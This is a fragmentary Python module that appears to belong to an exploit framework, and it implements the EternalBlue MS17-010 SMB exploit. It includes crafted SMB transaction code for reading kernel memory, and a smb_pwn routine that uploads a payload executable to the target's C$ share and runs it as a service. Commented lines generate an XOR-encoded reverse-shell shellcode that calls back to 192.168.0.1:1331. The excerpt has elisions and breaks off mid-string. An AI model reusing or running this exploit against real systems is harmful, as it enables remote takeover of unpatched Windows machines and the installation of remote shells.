...
INFO = {}
INFO['NAME'] = "ms17_010"
INFO['DESCRIPTION'] = "EternalBlue"
INFO['VENDOR'] = "exploitdb"
INFO['CVE Name'] = "CVE2017-0144"
INFO['NOTES'] = """
"""
INFO['DOWNLOAD_LINK'] = ""
INFO['LINKS'] = [""]
...
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.254", dict(description = 'Target')
OPTIONS["PIPE"] = "netlogon", dict(description = 'Pipe')
...
class exploit(Sploit):
	def __init__(self,host="",pipe="",ip="",portr=4000,logger=None):
	...
	def args(self):
		...
		self.pipe = self.args.get("PIPE", self.pipe)
	...
	def run(self):
		...
		def read_data(conn, infos, read_addr, read_size):
			fmt = infos['PTR_FMT']

			new_data = pack('<'+fmt*3, infos['trans2_addr']+infos['TRANS_FLINK_OFFSET'], infos['trans2_addr']+0x200, read_addr)  # OutParameter, InData, OutData
			...
			conn.send_nt_trans_secondary(mid=infos['trans1_mid'], data=new_data, dataDisplacement=infos['TRANS_OUTPARAM_OFFSET'])
			conn.send_nt_trans(5, param=pack('<HH', infos['fid'], 0), totalDataCount=0x4300-0x20, totalParameterCount=0x1000)
			conn.send_nt_trans_secondary(mid=infos['trans2_mid'])
			read_data = conn.recv_transaction_data(infos['trans2_mid'], 8+read_size)
			infos['trans2_addr'] = unpack_from('<'+fmt, read_data)[0] - infos['TRANS_FLINK_OFFSET']
	
			conn.send_nt_trans_secondary(mid=infos['trans1_mid'], param=pack('<'+fmt, infos['trans2_addr']), paramDisplacement=infos['TRANS_INDATA_OFFSET'])
			wait_for_request_processed(conn)

			conn.send_nt_trans_secondary(mid=infos['trans1_mid'], data=pack('<H', infos['trans2_mid']), dataDisplacement=infos['TRANS_MID_OFFSET'])
			wait_for_request_processed(conn)
		...
		def exploitMS(target, pipe_name):
			conn = MYSMB(target)
		...
		def smb_pwn(conn, arch):
			...
			#self.log('creating file c:\\pwned.txt on the target')
			#tid2 = smbConn.connectTree('C$')
			#fid2 = smbConn.createFile(tid2, '/pwned.txt')
			#smbConn.closeFile(tid2, fid2)
			#smbConn.disconnectTree(tid2)
			# ####################################################
			#s = OSShellcodes("WINDOWS", "32bit", '192.168.0.1', 1331)
			#shellcode_type = "reverse"
			#shellcode = s.create_shellcode(shellcode_type,encode="xor", make_exe=1,debug=1,filename="payloadEAST")
			# ####################################################
			# smb_send_file(smbConn, '/root/nwEAST/tmp/payloadEAST.exe', 'C', '/exploit.exe') 
			#service_exec(conn, r'cmd /c c:\exploit.exe')
			smb_send_file(smbConn, './tmp/payloadEAST.exe', 'C', '/exploitEAST.exe')
			service_exec(conn, r'cmd /c c:\exploitEAST.exe')
		...
		#if len(sys.argv) < 2:
		#	self.log("{} <ip> [pipe_name]".format(sys.argv[0]))
		#	sys.exit(1)
		#target = sys.argv[1]
		target = self.host
		pipe_name = self.pipe
		#pipe_name = None if len(sys.argv) < 3 else sys.argv[2]
		#exploitMS(target, pipe_name)
		self.log('Creating Shellcode...')		
		##########
		"""
		if [ info['arch'] == 'x86']:
			arch = "32bit"
